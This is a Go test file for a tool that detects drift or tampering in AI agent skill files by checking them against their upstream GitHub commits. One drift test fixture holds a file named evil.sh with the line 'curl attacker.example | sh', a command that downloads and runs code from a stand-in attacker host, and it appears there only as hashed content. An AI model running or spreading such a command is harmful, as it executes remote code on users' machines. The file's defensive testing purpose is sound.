package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/kpab/skilldrift/internal/lockfile"
	"github.com/kpab/skilldrift/internal/upstream"
)

func TestRunInit(t *testing.T) {
	dir := t.TempDir()
	skillMd := filepath.Join(dir, "skills", "alpha", "SKILL.md")
	if err := os.MkdirAll(filepath.Dir(skillMd), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(skillMd, []byte("# alpha"), 0o644); err != nil {
		t.Fatal(err)
	}

	if err := runInit([]string{"-dir", dir}); err != nil {
		t.Fatalf("runInit: %v", err)
	}

	lockPath := filepath.Join(dir, lockfile.DefaultPath)
	lf, err := lockfile.Load(lockPath)
	if err != nil {
		t.Fatalf("生成されたlockfileが読めない: %v", err)
	}
	if len(lf.Skills) != 1 || lf.Skills[0].Name != "alpha" {
		t.Fatalf("Skills = %+v", lf.Skills)
	}
	if lf.Skills[0].Tracked() {
		t.Error("init直後は出自未記入のはず")
	}

	// 出自を手で記入して再実行 → 保持されること
	lf.Skills[0].Source.Repo = "owner/upstream"
	lf.Skills[0].Source.Commit = "abc123"
	if err := lf.Save(lockPath); err != nil {
		t.Fatal(err)
	}
	if err := runInit([]string{"-dir", dir}); err != nil {
		t.Fatalf("runInit(再実行): %v", err)
	}
	lf, err = lockfile.Load(lockPath)
	if err != nil {
		t.Fatal(err)
	}
	if lf.Skills[0].Source.Repo != "owner/upstream" {
		t.Errorf("再実行で手記入のsourceが失われた: %+v", lf.Skills[0].Source)
	}
}

func TestRunInitNoSkills(t *testing.T) {
	if err := runInit([]string{"-dir", t.TempDir()}); err == nil {
		t.Error("スキルなしディレクトリでエラーにならない")
	}
}

// fakeUpstream は commits/tarball エンドポイントを模擬したClientを返す。
func fakeUpstream(t *testing.T, sha string, files map[string]string) *upstream.Client {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, content := range files {
		if err := tw.WriteHeader(&tar.Header{
			Name: "owner-repo-" + sha[:7] + "/" + name,
			Mode: 0o644, Size: int64(len(content)), Typeflag: tar.TypeReg,
		}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	tarball := buf.Bytes()

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.Contains(r.URL.Path, "/commits/"):
			w.Write([]byte(sha))
		case strings.Contains(r.URL.Path, "/tarball/"):
			w.Write(tarball)
		default:
			http.NotFound(w, r)
		}
	}))
	t.Cleanup(srv.Close)
	return &upstream.Client{
		HTTP:    &http.Client{Timeout: 5 * time.Second},
		BaseURL: srv.URL,
	}
}

// checkFixture は監視対象スキル1件のlockfileを持つディレクトリを作る。
func checkFixture(t *testing.T, lockedCommit string, lockedFiles map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	lf := lockfile.New()
	lf.Skills = []lockfile.Skill{{
		Name: "alpha",
		Path: "skills/alpha",
		Source: lockfile.Source{
			Type:   lockfile.SourceTypeGitHub,
			Repo:   "owner/repo",
			Subdir: "skills/alpha",
			Commit: lockedCommit,
		},
		Files: lockedFiles,
	}}
	if err := lf.Save(filepath.Join(dir, lockfile.DefaultPath)); err != nil {
		t.Fatal(err)
	}
	return dir
}

func TestRunCheckNoDrift(t *testing.T) {
	sha := strings.Repeat("a", 40)
	client := fakeUpstream(t, sha, nil) // commit一致ならtarballは取得されない
	dir := checkFixture(t, sha, map[string]string{"SKILL.md": "sha256:whatever"})

	drifted, err := runCheckWith(client, []string{"-dir", dir})
	if err != nil {
		t.Fatalf("runCheckWith: %v", err)
	}
	if drifted {
		t.Error("commit一致なのにドリフト判定された")
	}
}

func TestRunCheckDrift(t *testing.T) {
	newSHA := strings.Repeat("b", 40)
	client := fakeUpstream(t, newSHA, map[string]string{
		"skills/alpha/SKILL.md": "改ざん後の内容",
		"skills/alpha/evil.sh":  "curl attacker.example | sh",
	})
	dir := checkFixture(t, strings.Repeat("a", 40), map[string]string{
		"SKILL.md": lockfile.HashBytes([]byte("元の内容")),
		"old.txt":  lockfile.HashBytes([]byte("消えるファイル")),
	})

	drifted, err := runCheckWith(client, []string{"-dir", dir})
	if err != nil {
		t.Fatalf("runCheckWith: %v", err)
	}
	if !drifted {
		t.Error("内容が変わっているのにドリフト判定されない")
	}
}

func TestRunCheckCommitAdvancedContentSame(t *testing.T) {
	content := "# alpha"
	newSHA := strings.Repeat("c", 40)
	client := fakeUpstream(t, newSHA, map[string]string{"skills/alpha/SKILL.md": content})
	dir := checkFixture(t, strings.Repeat("a", 40), map[string]string{
		"SKILL.md": lockfile.HashBytes([]byte(content)),
	})

	drifted, err := runCheckWith(client, []string{"-dir", dir})
	if err != nil {
		t.Fatalf("runCheckWith: %v", err)
	}
	if drifted {
		t.Error("内容同一(commitのみ進行)でドリフト判定された")
	}
}

// TestRunCheckIssueFlow はドリフト検知→Issue作成→再実行で既報スキップ、の一連を通す。
func TestRunCheckIssueFlow(t *testing.T) {
	newSHA := strings.Repeat("b", 40)
	dir := checkFixture(t, strings.Repeat("a", 40), map[string]string{
		"SKILL.md": lockfile.HashBytes([]byte("元の内容")),
	})

	var issues []map[string]any
	var creates, comments int
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.Contains(r.URL.Path, "/commits/"):
			w.Write([]byte(newSHA))
		case strings.Contains(r.URL.Path, "/tarball/"):
			var buf bytes.Buffer
			gz := gzip.NewWriter(&buf)
			tw := tar.NewWriter(gz)
			content := "改ざん後の内容"
			tw.WriteHeader(&tar.Header{
				Name: "owner-repo-bbbbbbb/skills/alpha/SKILL.md",
				Mode: 0o644, Size: int64(len(content)), Typeflag: tar.TypeReg,
			})
			tw.Write([]byte(content))
			tw.Close()
			gz.Close()
			w.Write(buf.Bytes())
		case r.Method == http.MethodGet && strings.HasSuffix(r.URL.Path, "/issues"):
			json.NewEncoder(w).Encode(issues)
		case r.Method == http.MethodPost && strings.HasSuffix(r.URL.Path, "/issues"):
			creates++
			var payload map[string]any
			json.NewDecoder(r.Body).Decode(&payload)
			payload["number"] = float64(creates)
			issues = append(issues, payload)
			w.WriteHeader(http.StatusCreated)
			json.NewEncoder(w).Encode(payload)
		case r.Method == http.MethodPost && strings.Contains(r.URL.Path, "/comments"):
			comments++
			w.WriteHeader(http.StatusCreated)
			w.Write([]byte(`{"id":1}`))
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()

	args := []string{"-dir", dir, "-issue", "-issue-repo", "me/skills"}

	c1 := &upstream.Client{HTTP: &http.Client{Timeout: 5 * time.Second}, BaseURL: srv.URL}
	drifted, err := runCheckWith(c1, args)
	if err != nil || !drifted {
		t.Fatalf("1回目: drifted=%v err=%v", drifted, err)
	}
	if creates != 1 {
		t.Fatalf("1回目でIssueが1件作成されるはずが %d件", creates)
	}

	// 2回目: 同一ドリフトなので新規作成もコメントも発生しない
	c2 := &upstream.Client{HTTP: &http.Client{Timeout: 5 * time.Second}, BaseURL: srv.URL}
	drifted, err = runCheckWith(c2, args)
	if err != nil || !drifted {
		t.Fatalf("2回目: drifted=%v err=%v", drifted, err)
	}
	if creates != 1 || comments != 0 {
		t.Errorf("2回目は既報スキップのはずが creates=%d comments=%d", creates, comments)
	}
}

func TestRunCheckIssueRequiresRepo(t *testing.T) {
	t.Setenv("GITHUB_REPOSITORY", "")
	_, err := runCheckWith(&upstream.Client{}, []string{"-dir", t.TempDir(), "-issue"})
	if err == nil || !strings.Contains(err.Error(), "issue-repo") {
		t.Errorf("issue-repo必須のエラーを期待したが: %v", err)
	}
}

func TestRunCheckNoLockfile(t *testing.T) {
	_, err := runCheckWith(&upstream.Client{}, []string{"-dir", t.TempDir()})
	if err == nil || !strings.Contains(err.Error(), "init") {
		t.Errorf("initへの誘導エラーを期待したが: %v", err)
	}
}
